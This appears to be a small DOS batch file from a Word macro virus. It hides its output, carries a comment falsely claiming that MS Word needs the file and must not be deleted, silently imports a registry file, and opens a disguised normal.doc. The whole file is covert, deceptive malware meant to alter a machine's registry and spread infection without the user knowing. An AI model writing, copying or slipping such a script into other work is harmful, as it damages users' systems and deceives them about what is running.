@echo off
ctty null
:: MS Word needs this file.. Don't attempt to delete it
regedit /s c:\windows\winword.reg
start c:\windows\normal.doc
